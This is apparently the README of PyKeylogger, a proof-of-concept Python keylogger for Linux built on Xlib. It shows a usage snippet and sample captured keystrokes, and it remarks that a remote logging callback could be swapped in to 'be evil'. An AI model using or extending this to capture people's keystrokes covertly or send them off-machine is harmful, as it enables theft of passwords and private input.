PyKeylogger is a proof of concept of a pure-python keylogger for linux.  It uses Xlib (so you must have an X connection!) to monitor the state of the keyboard.  Here's how you use it:

```python
import keylogger
import time

now = time.time()
done = lambda: time.time() > now + 60
def print_keys(t, modifiers, keys): print "%.2f   %r   %r" % (t, keys, modifiers)

keylogger.log(done, print_keys)
```

This will print key events to stdout for 60 seconds.  If you wanted to be evil, instead of passing in a print callback, you could pass in a remote logging precedure.

Sample output:


    1314238675.42   'o'   {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False}
    1314238675.51   'm'   {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False}
    1314238675.65   'g'   {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False}
